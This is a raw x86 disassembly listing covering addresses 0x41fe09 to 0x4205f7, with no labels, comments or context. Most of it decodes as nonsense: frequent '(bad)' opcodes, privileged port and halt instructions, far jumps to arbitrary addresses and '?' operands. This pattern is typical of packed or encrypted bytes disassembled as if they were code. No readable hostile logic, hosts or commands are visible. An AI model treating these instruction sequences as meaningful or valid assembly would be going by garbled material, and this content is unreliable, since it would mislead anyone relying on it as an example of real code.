  41fe09:	cmp    al,0xd5
  41fe0b:	(bad)  
  41fe0c:	lock dec ebp
  41fe0e:	aaa    
  41fe0f:	jnp    0x41fd91
  41fe11:	lock dec eax
  41fe13:	pop    eax
  41fe14:	lods   al,BYTE PTR ds:[esi]
  41fe15:	cmp    esp,DWORD PTR [eax-0x871a91b]
  41fe1b:	dec    esi
  41fe1c:	ds into 
  41fe1e:	mov    eax,ds:0x7ecd3763
  41fe23:	or     eax,0xef29a591
  41fe28:	jg     0x41fe0c
  41fe2a:	scas   eax,DWORD PTR es:[edi]
  41fe2b:	xlat   BYTE PTR ds:[ebx]
  41fe2c:	lahf   
  41fe2d:	imul   eax,DWORD PTR [esi],0xffffffe5
  41fe30:	and    al,0x41
  41fe32:	mov    edi,0x8c827476
  41fe37:	in     al,0x1
  41fe39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe3a:	jo     0x41fdbc
  41fe3c:	mov    cl,0x89
  41fe3e:	inc    ebp
  41fe3f:	mov    WORD PTR ds:0xc26ae420,ds
  41fe45:	mov    eax,0x2674cb9f
  41fe4a:	arpl   WORD PTR [esi-0x28],cx
  41fe4d:	xor    al,0x58
  41fe4f:	lock pop eax
  41fe51:	or     BYTE PTR [eax],al
  41fe53:	inc    esi
  41fe54:	dec    eax
  41fe55:	jno    0x41fe26
  41fe57:	jg     0x41fec3
  41fe59:	pusha  
  41fe5a:	ficom  WORD PTR [eax]
  41fe5d:	adc    DWORD PTR [esi+eiz*1-0x6d5022d6],ebx
  41fe64:	push   edx
  41fe65:	mov    eax,ds:0x5d07eb7c
  41fe6a:	int3   
  41fe6b:	cmp    DWORD PTR [esi+0x6b],0x384f8741
  41fe72:	adc    al,0x36
  41fe74:	jmp    0x41fea4
  41fe76:	nop
  41fe77:	or     eax,ebp
  41fe79:	nop
  41fe7a:	adc    DWORD PTR [eax-0x58],esp
  41fe7d:	inc    ebx
  41fe7e:	or     ah,BYTE PTR [eax+0x15ae66e3]
  41fe84:	sbb    eax,0xb3104daa
  41fe89:	call   0x5f3:0xf71f268d
  41fe90:	lods   al,BYTE PTR ds:[esi]
  41fe91:	add    al,0x20
  41fe93:	sahf   
  41fe94:	mov    DWORD PTR cs:[edx-0x30],0xc08925f6
  41fe9c:	dec    esi
  41fe9d:	jecxz  0x41fea1
  41fe9f:	mov    ecx,edi
  41fea1:	mov    eax,0x32875765
  41fea6:	cld    
  41fea7:	outs   dx,DWORD PTR ds:[esi]
  41fea8:	push   es
  41fea9:	idiv   BYTE PTR [edi-0x2]
  41feac:	add    DWORD PTR [eax+0xfb12410],edx
  41feb2:	lock cmc 
  41feb4:	mov    esp,0xc6f09456
  41feb9:	in     eax,0xb1
  41febb:	icebp  
  41febc:	jns    0x41ff08
  41febe:	pop    ebx
  41febf:	ins    BYTE PTR es:[edi],dx
  41fec0:	push   0x40d9ad28
  41fec5:	mov    al,ds:0xe1e6a9a9
  41feca:	sti    
  41fecb:	gs xor ebp,ebp
  41fece:	aad    0xba
  41fed0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fed1:	mov    cl,BYTE PTR [ebx-0x7291598b]
  41fed7:	sub    eax,0x2fb55af
  41fedc:	inc    edi
  41fedd:	les    esp,FWORD PTR [esp+eiz*8-0x3b885cc8]
  41fee4:	pop    ss
  41fee5:	int    0xb1
  41fee7:	or     DWORD PTR [ecx],0xe
  41feea:	pop    ebx
  41feeb:	lock call 0x192f51e2
  41fef1:	or     ah,BYTE PTR [eax-0x77]
  41fef4:	(bad)  
  41fef6:	mov    bh,0xaa
  41fef8:	mov    ebx,0xce48f08d
  41fefd:	ja     0x41fe90
  41feff:	xchg   edx,eax
  41ff00:	(bad)  
  41ff01:	in     eax,dx
  41ff02:	retf   
  41ff03:	leave  
  41ff04:	sub    eax,0x59194a52
  41ff09:	ja     0x41fee4
  41ff0b:	fwait
  41ff0c:	and    esp,DWORD PTR [esi+0x36]
  41ff0f:	fwait
  41ff10:	push   edx
  41ff11:	dec    eax
  41ff12:	(bad)  
  41ff13:	test   DWORD PTR [edx],ebp
  41ff15:	mov    dl,0x43
  41ff17:	fistp  WORD PTR [eax+esi*4-0x2538014]
  41ff1e:	sar    dh,1
  41ff20:	mov    edi,0x48944282
  41ff25:	dec    edi
  41ff26:	rcr    DWORD PTR [ebp-0x5f6ac090],cl
  41ff2c:	xlat   BYTE PTR ds:[ebx]
  41ff2d:	mov    edi,0x5152f5f9
  41ff32:	push   esp
  41ff33:	sub    ah,BYTE PTR [edi]
  41ff35:	sub    BYTE PTR [eax],0x21
  41ff38:	mov    ds:0xa4f364f2,eax
  41ff3d:	inc    esp
  41ff3e:	and    DWORD PTR [edx+0x5b4e4086],eax
  41ff44:	inc    esi
  41ff45:	es hlt 
  41ff47:	cmp    dh,ah
  41ff49:	aad    0x7f
  41ff4b:	in     eax,dx
  41ff4c:	fwait
  41ff4d:	repnz sub ah,BYTE PTR [esi-0x7a5dbd82]
  41ff54:	inc    eax
  41ff55:	ins    BYTE PTR es:[edi],dx
  41ff56:	jmp    0x7443bf6e
  41ff5b:	push   eax
  41ff5c:	push   edx
  41ff5d:	mov    edi,0x3bbdff04
  41ff62:	mov    cl,BYTE PTR [eax]
  41ff64:	leave  
  41ff65:	inc    esp
  41ff66:	and    BYTE PTR [eax-0x7382f371],dl
  41ff6c:	mov    al,ds:0xfcbce3
  41ff71:	pop    ds
  41ff72:	test   eax,0x851354d6
  41ff77:	test   eax,0x6f87af1e
  41ff7c:	lods   al,BYTE PTR ds:[esi]
  41ff7d:	clc    
  41ff7e:	mov    dl,0x18
  41ff80:	sbb    al,0xba
  41ff82:	pop    ebx
  41ff83:	jo     0x41ff3e
  41ff85:	popf   
  41ff86:	mov    WORD PTR [esi-0x63d5f2b9],ds
  41ff8c:	dec    eax
  41ff8d:	sub    ebp,DWORD PTR [esi]
  41ff8f:	push   edx
  41ff90:	lea    esi,[ecx+0x64]
  41ff93:	push   esi
  41ff94:	lods   al,BYTE PTR ds:[esi]
  41ff95:	jne    0x41ff9d
  41ff97:	pop    eax
  41ff98:	mov    WORD PTR [ecx],es
  41ff9a:	or     edx,edx
  41ff9c:	int    0xb
  41ff9e:	dec    esi
  41ff9f:	nop
  41ffa0:	aad    0x5a
  41ffa2:	mov    fs,WORD PTR [ebx]
  41ffa4:	(bad)  
  41ffa5:	ja     0x41ff82
  41ffa7:	or     edx,DWORD PTR [esi-0x370a4103]
  41ffad:	sub    BYTE PTR [eax],ch
  41ffaf:	mov    al,ds:0x54726aab
  41ffb4:	out    0xb4,al
  41ffb6:	adc    eax,0x8f2c9a97
  41ffbb:	push   edi
  41ffbc:	mov    ds:0x55674997,al
  41ffc1:	jo     0x420023
  41ffc3:	aam    0x71
  41ffc5:	sbb    BYTE PTR [ecx-0x404aa23a],bl
  41ffcb:	and    DWORD PTR [ebx+0x5c28710],0x606dcb6
  41ffd5:	sti    
  41ffd6:	xchg   edi,eax
  41ffd7:	(bad)  
  41ffd8:	shl    bl,1
  41ffda:	loopne 0x41ffb6
  41ffdc:	push   ds
  41ffdd:	add    bh,BYTE PTR [edi+edx*8]
  41ffe0:	or     al,0xea
  41ffe2:	push   edi
  41ffe3:	fnstenv [ebx+0x13]
  41ffe6:	std    
  41ffe7:	sbb    bh,dh
  41ffe9:	fimul  DWORD PTR ds:0xc4d9c09c
  41ffef:	dec    esp
  41fff0:	fcmovnu st,st(2)
  41fff2:	shl    BYTE PTR [ebp-0x46],cl
  41fff5:	jne    0x420017
  41fff7:	and    ebx,DWORD PTR [ebx]
  41fff9:	push   ds
  41fffa:	and    ah,bh
  41fffc:	bound  edi,QWORD PTR [edi]
  41fffe:	ins    BYTE PTR es:[edi],dx
  41ffff:	adc    DWORD PTR [ebp-0x1895b78e],ebp
  420005:	popa   
  420006:	sbb    ch,BYTE PTR [eax]
  420008:	setnp  BYTE PTR [ebx]
  42000b:	in     eax,0xde
  42000d:	xchg   esi,eax
  42000e:	cmp    eax,0x54b359b9
  420013:	iret   
  420014:	jb     0x41ffbb
  420016:	repz adc BYTE PTR [esp+edi*2+0x400380e0],al
  42001e:	adc    bh,bh
  420020:	push   ds
  420021:	test   DWORD PTR [esi],esi
  420023:	push   esi
  420024:	cmc    
  420025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420026:	les    esi,FWORD PTR [esi+0x5d]
  420029:	xor    DWORD PTR [ebp+0x6b],0xd6c0a98c
  420030:	call   0x5bd6a799
  420035:	add    eax,edx
  420037:	mov    edx,0x1526c44d
  42003c:	into   
  42003d:	or     DWORD PTR [ebp+ebx*8+0x43],esi
  420041:	clc    
  420042:	sbb    al,0xdd
  420044:	pop    esi
  420045:	cmp    eax,0xc44706b9
  42004a:	xlat   BYTE PTR ds:[ebx]
  42004b:	sbb    cl,BYTE PTR [ebp+0x1d]
  42004e:	mov    WORD PTR [bp+si],?
  420051:	imul   edx,DWORD PTR [edi-0x17],0xa3b492ad
  420058:	rcl    DWORD PTR [edx+edx*1-0x59bd19c5],0x75
  420060:	es mov esi,0x3c629f33
  420066:	popa   
  420067:	popa   
  420068:	sub    ch,BYTE PTR [esi-0x4a]
  42006b:	rep ins BYTE PTR es:[edi],dx
  42006d:	bound  ecx,QWORD PTR [edx+edi*4+0x23]
  420071:	ret    0xee
  420074:	in     al,0x56
  420076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420077:	push   esp
  420078:	cld    
  420079:	test   al,0x15
  42007b:	sbb    eax,0xbcc03399
  420080:	inc    ebx
  420081:	mov    bl,0xc
  420083:	leave  
  420084:	mov    al,ds:0xef30d7ca
  420089:	fnstcw WORD PTR [edi-0x68]
  42008c:	ins    BYTE PTR es:[edi],dx
  42008d:	fdiv   QWORD PTR [edi+0x7696f3]
  420093:	xchg   ecx,eax
  420094:	mov    ?,WORD PTR [edi-0x6e47c4c4]
  42009a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42009b:	retf   0xe085
  42009e:	mov    DWORD PTR [ecx],eax
  4200a0:	adc    eax,0x4707409f
  4200a5:	scas   al,BYTE PTR es:[edi]
  4200a6:	jmp    0x3ba7:0x691eb34b
  4200ad:	setns  ch
  4200b0:	pusha  
  4200b1:	inc    esi
  4200b2:	dec    edx
  4200b3:	inc    edi
  4200b4:	push   0x59aaa717
  4200b9:	je     0x420136
  4200bb:	cs dec edx
  4200bd:	mov    ss,WORD PTR [edx]
  4200bf:	lods   eax,DWORD PTR ds:[esi]
  4200c0:	in     al,0x8c
  4200c2:	popf   
  4200c3:	mov    al,0xdf
  4200c5:	ins    DWORD PTR es:[edi],dx
  4200c6:	shl    DWORD PTR [esi+0x5b87a424],cl
  4200cc:	push   cs
  4200cd:	retf   
  4200ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200cf:	or     dh,BYTE PTR [ecx-0x43]
  4200d2:	jne    0x42014b
  4200d4:	aam    0x6c
  4200d6:	(bad)  
  4200d8:	inc    DWORD PTR [ebp+eiz*8-0x77287228]
  4200df:	jmp    0x4200d0
  4200e1:	fst    QWORD PTR [edi+0x1d]
  4200e4:	call   DWORD PTR cs:[esp+eiz*8]
  4200e8:	in     al,dx
  4200e9:	(bad)  
  4200ea:	jno    0x4200e3
  4200ec:	sbb    DWORD PTR [edx+0x77],edi
  4200ef:	sar    eax,0x63
  4200f2:	daa    
  4200f3:	shr    BYTE PTR [ebp+0xc092c47],0xa0
  4200fa:	sub    eax,0x4d781946
  4200ff:	aas    
  420100:	add    ebp,DWORD PTR [ebx+esi*8-0x377250df]
  420107:	ds ins DWORD PTR es:[edi],dx
  420109:	add    DWORD PTR [ebx+0x7a83f2f6],ebp
  42010f:	loope  0x4200b7
  420111:	or     ch,BYTE PTR [esi-0x735a72a3]
  420117:	or     BYTE PTR [eax-0x75],0x4a
  42011b:	repz mov edi,0xe767fba7
  420121:	adc    ecx,DWORD PTR [eax+0x77dc7ca0]
  420127:	and    al,0x72
  420129:	je     0x420115
  42012b:	push   0xffffffe0
  42012d:	xor    ecx,ebx
  42012f:	into   
  420130:	mov    dh,BYTE PTR [ebx+0x866bf31]
  420136:	mov    bh,0x88
  420138:	gs jmp 0x42015e
  42013b:	lods   al,BYTE PTR ds:[esi]
  42013c:	stos   BYTE PTR es:[edi],al
  42013d:	fs jns 0x420112
  420140:	jecxz  0x420190
  420142:	retf   
  420143:	push   esi
  420144:	jno    0x42018e
  420146:	pop    bp
  420148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420149:	jns    0x420185
  42014b:	int3   
  42014c:	add    esi,DWORD PTR [edi+0x35739c30]
  420152:	scas   eax,DWORD PTR es:[edi]
  420153:	retf   
  420154:	mov    ds:0xb0d42b30,al
  420159:	cmp    al,0xb
  42015b:	add    eax,0xb1273ef4
  420160:	mov    al,0x3f
  420162:	sbb    DWORD PTR [esi-0x9ade9da],ebx
  420168:	fmul   DWORD PTR [ebx+esi*2-0x11]
  42016c:	mov    BYTE PTR [ebx+eax*4-0x53],dl
  420170:	and    cl,cl
  420172:	jecxz  0x420170
  420174:	fs xor eax,0xceb79d9e
  42017a:	ds test ah,ch
  42017d:	sub    BYTE PTR [ecx],ah
  42017f:	adc    BYTE PTR [edx+0x0],dl
	...
  42018a:	pop    ecx
  42018b:	push   edi
  42018c:	inc    ecx
  42018d:	dec    ebx
  42018e:	dec    edi
  42018f:	pop    edi
  420190:	pop    ebx
  420191:	push   edi
  420192:	sub    al,0x52
  420194:	xchg   DWORD PTR [ebx-0x12],esi
  420197:	(bad)  
  420198:	cld    
  420199:	(bad)  
  42019b:	nop
  42019c:	add    DWORD PTR [eax],eax
  42019e:	jg     0x4201a6
  4201a0:	add    BYTE PTR [eax],al
  4201a2:	nop
  4201a3:	inc    ebx
  4201a4:	in     eax,0x3d
  4201a6:	enter  0x4e41,0x7c
  4201aa:	shl    BYTE PTR [edi*8+0x33f2ce06],0x21
  4201b2:	shr    BYTE PTR [esi+0x7ea95c69],cl
  4201b8:	(bad)  
  4201b9:	mov    bl,0xf4
  4201bb:	or     BYTE PTR [eax-0x64bfcd80],ch
  4201c1:	cmp    ecx,DWORD PTR [ebx-0x74]
  4201c4:	push   cs
  4201c5:	mov    esi,0xae9297b8
  4201ca:	ss int3 
  4201cc:	int3   
  4201cd:	dec    ecx
  4201ce:	lods   al,BYTE PTR ds:[esi]
  4201cf:	bound  ebp,QWORD PTR [eax-0x35d5e6d6]
  4201d5:	mov    edi,0x951f91e4
  4201da:	add    eax,0x4c2f7645
  4201df:	ret    0xe311
  4201e2:	fcompp 
  4201e4:	bound  ebx,QWORD PTR [edx+0x65]
  4201e7:	push   edx
  4201e8:	sbb    al,0xda
  4201ea:	into   
  4201eb:	iret   
  4201ec:	cmc    
  4201ed:	adc    edx,ebp
  4201ef:	int    0x40
  4201f1:	call   0xdc79998
  4201f6:	iret   
  4201f7:	stc    
  4201f8:	fwait
  4201f9:	sar    BYTE PTR [edx],cl
  4201fb:	jmp    DWORD PTR [eax-0x42d2097e]
  420201:	ret    
  420202:	jmp    0xe609:0xfe471e5f
  420209:	mov    ds:0x1693956,al
  42020e:	xchg   esi,eax
  42020f:	inc    eax
  420210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420211:	into   
  420212:	or     BYTE PTR [ebx],ch
  420214:	mov    cl,0x76
  420216:	rcl    cl,0x26
  420219:	bound  esi,QWORD PTR [eax-0x76]
  42021c:	mov    al,ds:0x1b7ef79c
  420221:	sbb    ebp,DWORD PTR [edi-0x23]
  420224:	test   eax,0x452409de
  420229:	xchg   edi,eax
  42022a:	mov    esp,0x5e93110d
  42022f:	repz je 0x420255
  420232:	(bad)  
  420233:	popf   
  420234:	mov    eax,ds:0xaca1905e
  420239:	jo     0x42023f
  42023b:	mov    edi,0x3e76098f
  420240:	lods   eax,DWORD PTR ds:[esi]
  420241:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420242:	cmc    
  420243:	jmp    0x4bc8e93d
  420248:	test   DWORD PTR [eax],0x82bd5cd2
  42024e:	mov    esi,0x7ebfe1ea
  420253:	fs scas eax,DWORD PTR es:[edi]
  420255:	adc    BYTE PTR [edi+0x6e],0x17
  420259:	es pop edi
  42025b:	retf   0xbcef
  42025e:	out    0x58,eax
  420260:	pop    esi
  420261:	jae    0x4201e8
  420263:	dec    ebp
  420264:	cmp    edx,DWORD PTR [ebx+0x1e0e10d5]
  42026a:	push   edi
  42026b:	push   ds
  42026c:	xchg   edx,eax
  42026d:	lods   al,BYTE PTR ds:[esi]
  42026e:	or     DWORD PTR [ecx-0x37423532],0xffffff83
  420275:	add    al,0x48
  420277:	and    DWORD PTR [edx],ecx
  420279:	or     ebx,DWORD PTR [ecx]
  42027b:	xor    eax,0x6ed89211
  420280:	fnstsw WORD PTR [edx+ecx*8-0x17e7c481]
  420287:	call   0xbbe:0x942cf9b3
  42028e:	out    dx,eax
  42028f:	add    eax,0xffdc637c
  420294:	cmp    al,0x35
  420296:	xchg   bl,bh
  420298:	(bad)  
  420299:	clc    
  42029a:	xor    cl,BYTE PTR [esi-0x7597ed8a]
  4202a0:	imul   edx,edx,0xde0789b0
  4202a6:	mov    ch,0x85
  4202a8:	nop
  4202a9:	into   
  4202aa:	loop   0x4202b1
  4202ac:	jg     0x4202df
  4202ae:	lods   al,BYTE PTR ds:[esi]
  4202af:	js     0x4202b1
  4202b1:	ins    DWORD PTR es:[edi],dx
  4202b2:	call   0x23c3:0xa3061abc
  4202b9:	fisttp DWORD PTR [esi]
  4202bb:	fmul   QWORD PTR [edi]
  4202bd:	mov    eax,0x7342ba9b
  4202c2:	and    BYTE PTR [ebp*2-0x3b51fdce],dh
  4202c9:	mov    DWORD PTR [ebp-0x5e],edi
  4202cc:	cmp    al,BYTE PTR [ebx+0x7855bb00]
  4202d2:	push   esi
  4202d3:	cmp    ebp,eax
  4202d5:	add    BYTE PTR [ecx+0x8],0x92
  4202d9:	lds    edx,FWORD PTR [edx+0x359858e2]
  4202df:	das    
  4202e0:	inc    eax
  4202e1:	jns    0x4202b5
  4202e3:	arpl   WORD PTR [ecx-0x14],bp
  4202e6:	xor    BYTE PTR [ebp+edx*2+0x7d],ah
  4202ea:	clc    
  4202eb:	sbb    DWORD PTR [esi],0x19c5a324
  4202f1:	xor    al,0x73
  4202f3:	(bad)  
  4202f4:	jno    0x42031c
  4202f6:	sti    
  4202f7:	ret    
  4202f8:	imul   esp,DWORD PTR [ecx],0xffffffaf
  4202fb:	dec    esi
  4202fc:	call   0xe6977289
  420301:	xlat   BYTE PTR ds:[ebx]
  420302:	inc    ebp
  420303:	xor    al,0x41
  420305:	mov    ds:0x7099dd32,al
  42030a:	fucomip st,st(6)
  42030c:	adc    al,0x77
  42030e:	add    eax,DWORD PTR [ecx]
  420310:	adc    ah,0x50
  420313:	aas    
  420314:	fldenv [esi+0x3b9d79aa]
  42031a:	lods   eax,DWORD PTR ds:[esi]
  42031b:	push   esp
  42031c:	lds    edx,FWORD PTR [esi]
  42031e:	xchg   ecx,eax
  42031f:	and    eax,0xb92e32fb
  420324:	sbb    BYTE PTR [ebx-0x2e],ch
  420327:	mov    eax,ds:0x506d0870
  42032c:	ficom  WORD PTR [esi+ecx*2+0x70b59eff]
  420333:	xchg   edx,eax
  420334:	adc    eax,0x5b6c65ca
  420339:	dec    esi
  42033a:	(bad)  
  42033b:	mov    ecx,0x2f596820
  420340:	sub    eax,0xb074094d
  420345:	inc    eax
  420346:	cmp    al,0x61
  420348:	loope  0x420367
  42034a:	loope  0x4203b5
  42034c:	das    
  42034d:	mov    ebx,0x9aebcfb6
  420352:	xlat   BYTE PTR ds:[ebx]
  420353:	and    ebp,DWORD PTR [ecx-0x27390de7]
  420359:	ret    
  42035a:	ins    BYTE PTR es:[edi],dx
  42035b:	in     eax,dx
  42035c:	inc    esi
  42035d:	xor    DWORD PTR [ebp+0x765d8b68],ecx
  420363:	inc    esi
  420364:	sbb    ecx,ebp
  420366:	jbe    0x420302
  420368:	add    BYTE PTR [ecx],al
  42036a:	aad    0x8c
  42036c:	inc    edi
  42036d:	in     al,0xaa
  42036f:	cwde   
  420370:	dec    esp
  420371:	xor    dh,BYTE PTR ds:0xad217f9d
  420377:	cmp    DWORD PTR [edi-0x1e6fd18],edi
  42037d:	loope  0x420362
  42037f:	dec    ebx
  420380:	adc    al,0xc3
  420382:	dec    eax
  420383:	out    0x9a,eax
  420385:	lahf   
  420386:	in     eax,0x98
  420388:	fdivr  DWORD PTR [ebx]
  42038a:	xor    ebp,esp
  42038c:	inc    esp
  42038d:	sub    bh,dl
  42038f:	ret    
  420390:	xor    esp,eax
  420392:	mov    dl,ah
  420394:	pop    esp
  420395:	lds    eax,FWORD PTR [esi+0x45f746b4]
  42039b:	aas    
  42039c:	(bad)  
  42039d:	lock loope 0x4203c4
  4203a0:	rcl    DWORD PTR [esi-0x77d0e098],1
  4203a6:	sub    BYTE PTR [ecx],cl
  4203a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203a9:	loope  0x42040a
  4203ab:	add    al,0xb2
  4203ad:	pcmpgtd mm6,QWORD PTR [edi-0x27fd7e18]
  4203b4:	pushf  
  4203b5:	out    dx,eax
  4203b6:	adc    dl,BYTE PTR [esi]
  4203b8:	nop
  4203b9:	cmp    BYTE PTR [eax],0x36
  4203bc:	rol    eax,cl
  4203be:	(bad)  
  4203bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203c0:	dec    esi
  4203c1:	dec    esi
  4203c2:	xchg   ebx,eax
  4203c3:	or     BYTE PTR [ebx-0x7c],dl
  4203c6:	fwait
  4203c7:	push   eax
  4203c8:	ja     0x420380
  4203ca:	stos   DWORD PTR es:[edi],eax
  4203cb:	sub    DWORD PTR [esi+edi*2],edi
  4203ce:	mov    ds:0xe76a1709,eax
  4203d3:	mov    edi,0x3d8da193
  4203d8:	xchg   edx,eax
  4203d9:	push   es
  4203da:	jl     0x42038d
  4203dc:	xchg   DWORD PTR [edx+0x7f3cb80c],esp
  4203e2:	lods   al,BYTE PTR ds:[esi]
  4203e3:	inc    ebp
  4203e4:	and    al,0x6a
  4203e6:	cmp    DWORD PTR [esi+0x7ddc7e43],edx
  4203ec:	or     dl,ah
  4203ee:	fcmovu st,st(3)
  4203f0:	les    ebx,FWORD PTR [ebx+0x46]
  4203f3:	lods   al,BYTE PTR ds:[esi]
  4203f4:	sub    al,0x99
  4203f6:	cmp    edi,ebp
  4203f8:	and    ch,0x96
  4203fb:	out    dx,eax
  4203fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203fd:	mov    ch,bh
  4203ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420400:	jl     0x4203ea
  420402:	(bad)  
  420403:	(bad)  
  420404:	sbb    DWORD PTR [edx-0x6c],ebx
  420407:	mov    cl,ch
  420409:	dec    ecx
  42040a:	addr16 das 
  42040c:	in     eax,0x36
  42040e:	mov    WORD PTR [ebx+0x22],?
  420411:	fs dec edx
  420413:	(bad)  
  420414:	push   ds
  420415:	push   ebx
  420416:	xor    edx,DWORD PTR es:0x8225da2e
  42041d:	jbe    0x4203c1
  42041f:	jne    0x4203c5
  420421:	jo     0x4203f4
  420423:	inc    ebp
  420424:	xor    eax,0x3abae338
  420429:	fld    TBYTE PTR [edi-0x61]
  42042c:	test   BYTE PTR [eax-0x77],bl
  42042f:	add    eax,DWORD PTR [esi+ecx*2+0x115ee931]
  420436:	push   ds
  420437:	inc    edi
  420438:	xor    al,0x47
  42043a:	jnp    0x4203bc
  42043c:	fs cmp eax,0x4fae41a8
  420442:	inc    DWORD PTR [edi+0x162d33f4]
  420448:	mov    al,0xc7
  42044a:	push   0x6a
  42044c:	sbb    ebp,0x3c6ed0bd
  420452:	xor    ch,BYTE PTR [esi-0x39]
  420455:	lds    esp,FWORD PTR ds:0x2d45228c
  42045b:	(bad)  
  42045c:	cld    
  42045d:	push   cs
  42045e:	test   DWORD PTR [edi],ebx
  420460:	fbld   TBYTE PTR [edi]
  420462:	(bad)  
  420464:	jbe    0x42040e
  420466:	cdq    
  420467:	ins    BYTE PTR es:[edi],dx
  420468:	add    DWORD PTR [ebx+0x41],0xfffffff1
  42046c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42046d:	retf   
  42046e:	inc    ebp
  42046f:	test   DWORD PTR [ecx+ebp*4],0x1de003b3
  420476:	xor    al,BYTE PTR [eax-0x77]
  420479:	sub    al,0xcf
  42047b:	adc    edx,edx
  42047d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42047e:	adc    al,0x45
  420480:	add    BYTE PTR [esi-0x37],dh
  420483:	pop    esi
  420484:	cmp    DWORD PTR [ecx-0x23c2d156],ebp
  42048a:	dec    ebx
  42048b:	mov    BYTE PTR [edx+ecx*4-0x3120a421],dh
  420492:	(bad)  [ebp+0x39]
  420495:	jmp    0x4204a6
  420497:	nop
  420498:	fs sbb edi,0xffffffdd
  42049c:	ds inc ebx
  42049e:	(bad)  
  42049f:	and    ah,BYTE PTR [ecx-0x59a90a1d]
  4204a5:	imul   ebx,DWORD PTR [edi-0xb6f0b9d],0x3b729114
  4204af:	sub    BYTE PTR [eax],0x37
  4204b2:	std    
  4204b3:	sub    ebp,DWORD PTR [edx-0x545e69dc]
  4204b9:	inc    esi
  4204ba:	js     0x4204f2
  4204bc:	sub    DWORD PTR [edi],eax
  4204be:	pop    ss
  4204bf:	cmp    DWORD PTR [edi-0x2799ebe5],ebp
  4204c5:	les    ebp,FWORD PTR [ebp-0x6d2ea0f2]
  4204cb:	mov    dh,0x9b
  4204cd:	loope  0x42051d
  4204cf:	sub    cl,BYTE PTR [ecx+edx*4+0x17d47464]
  4204d6:	or     dl,BYTE PTR [edi+eiz*4-0x150577f5]
  4204dd:	inc    edi
  4204de:	sub    BYTE PTR [edi],cl
  4204e0:	inc    esp
  4204e1:	in     al,0xf5
  4204e3:	mov    BYTE PTR [eax+0x36283264],0x3d
  4204ea:	int    0x38
  4204ec:	mov    bh,0xbf
  4204ee:	xchg   BYTE PTR [ebx+0x5e],dl
  4204f1:	out    dx,eax
  4204f2:	xchg   ebp,eax
  4204f3:	imul   esp,DWORD PTR [edi+0x18d9ca0f],0xffffffac
  4204fa:	loopne 0x420500
  4204fc:	aam    0x0
  4204fe:	jnp    0x4204f1
  420500:	mov    bl,0x93
  420502:	ret    0x32cc
  420505:	(bad)  
  420506:	int3   
  420507:	mov    dl,0xaa
  42050a:	dec    edx
  42050c:	pushf  
  42050d:	loopne 0x4204a4
  42050f:	mov    ecx,0x767112a4
  420514:	in     eax,0x9a
  420516:	ror    DWORD PTR [edi*1-0x3f9a431a],1
  42051d:	cdq    
  42051e:	retf   0xc6de
  420521:	popf   
  420522:	(bad)  [esi+0x53]
  420525:	ret    0x716e
  420528:	or     DWORD PTR [edi+0x7dfe1c6d],edi
  42052e:	adc    eax,0x33a35355
  420533:	mov    eax,ds:0xb6d9478a
  420538:	mov    es:0xb8c625dd,al
  42053e:	fwait
  42053f:	sbb    eax,0x50338d6b
  420544:	imul   edi,DWORD PTR ss:[esi-0x6b8f07fc],0x27fc7d1e
  42054f:	lahf   
  420550:	xchg   edx,eax
  420551:	inc    eax
  420552:	inc    ebx
  420553:	push   0x8ed550a8
  420558:	mov    eax,0x461a976b
  42055d:	dec    eax
  42055e:	repz mov ds:0xa945b240,al
  420564:	outs   dx,BYTE PTR ds:[esi]
  420565:	jne    0x42058b
  420567:	jle    0x420586
  420569:	es leave 
  42056b:	mov    esp,0x849b8202
  420570:	imul   ebx,DWORD PTR [esi+ecx*1],0x5d
  420574:	lods   al,BYTE PTR ds:[esi]
  420575:	int3   
  420576:	jnp    0x42056c
  420578:	lea    ebp,[ebp-0x22]
  42057b:	or     bh,ch
  42057d:	sbb    al,0xf3
  42057f:	cdq    
  420580:	add    BYTE PTR [eax-0x48],dl
  420583:	arpl   WORD PTR ds:0xa96e269,si
  420589:	(bad)  
  42058a:	ins    BYTE PTR es:[edi],dx
  42058b:	jb     0x42051c
  42058d:	jmp    DWORD PTR [esi-0x16]
  420590:	lahf   
  420591:	xlat   BYTE PTR gs:[ebx]
  420593:	and    eax,0x63f2b9f8
  420598:	je     0x420609
  42059a:	lea    ecx,[ecx+0x7a]
  42059d:	xchg   edx,eax
  42059e:	popa   
  42059f:	aad    0x7a
  4205a1:	imul   ecx,DWORD PTR [edi+0x3d26d48],0xffffffe8
  4205a8:	pop    ss
  4205a9:	lahf   
  4205aa:	stc    
  4205ab:	mov    ecx,DWORD PTR [edx-0x29]
  4205ae:	xor    eax,0xf4d00994
  4205b3:	ins    DWORD PTR es:[edi],dx
  4205b4:	sar    DWORD PTR [ecx],cl
  4205b6:	mov    al,0xb8
  4205b8:	cwde   
  4205b9:	inc    edx
  4205ba:	enter  0x446b,0x1
  4205be:	mov    WORD PTR ds:0x48dd71aa,?
  4205c4:	cli    
  4205c5:	je     0x4205c8
  4205c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205c8:	ret    
  4205c9:	or     al,0x48
  4205cb:	mov    eax,0x3ed4816
  4205d0:	popf   
  4205d1:	pop    edi
  4205d2:	jp     0x420633
  4205d4:	cwde   
  4205d5:	or     DWORD PTR [ebx-0x20],ebx
  4205d8:	clc    
  4205d9:	dec    edi
  4205da:	inc    esi
  4205db:	shl    BYTE PTR [edx+eiz*2],cl
  4205de:	or     eax,0xe835bcdd
  4205e3:	jmp    0xa6299ead
  4205e8:	jmp    0x250c4513
  4205ed:	and    DWORD PTR [eax+0x7a8778f7],eax
  4205f3:	dec    esi
  4205f4:	jl     0x4205be
  4205f6:	push   esi
  4205f7:	jle    0x420600
